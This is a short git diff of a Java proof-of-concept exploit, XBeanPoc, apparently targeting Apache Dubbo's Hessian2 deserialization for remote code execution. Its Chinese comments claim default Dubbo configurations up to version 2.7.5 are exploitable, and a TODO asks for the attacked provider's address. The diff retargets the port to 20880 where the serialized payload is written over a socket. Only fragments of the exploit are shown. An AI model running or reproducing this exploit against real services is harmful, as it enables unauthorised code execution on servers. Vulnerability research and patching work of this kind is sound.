@@ -13,14 +13,11 @@ import java.util.Random;
 import javax.naming.Context;
 import javax.naming.Reference;
 import org.apache.dubbo.common.io.Bytes;
-import org.apache.dubbo.common.serialize.Cleanable;
 import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
 import org.apache.xbean.naming.context.WritableContext;
 
 /**
- * dubbo 默认配置，即hessian2反序列化，都可RCE
- *
- * 需要dubbo环境版本<=2.6.3
+ * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
  *
  * <dependency>
  *   <groupId>org.apache.xbean</groupId>
@@ -80,7 +77,7 @@ public class XBeanPoc {
     byte[] bytes = byteArrayOutputStream.toByteArray();
 
     //todo 此处填写被攻击的dubbo服务提供者地址和端口
-    Socket socket = new Socket("127.0.0.1", 20881);
+    Socket socket = new Socket("127.0.0.1", 20880);
     OutputStream outputStream = socket.getOutputStream();
     outputStream.write(bytes);
     outputStream.flush();
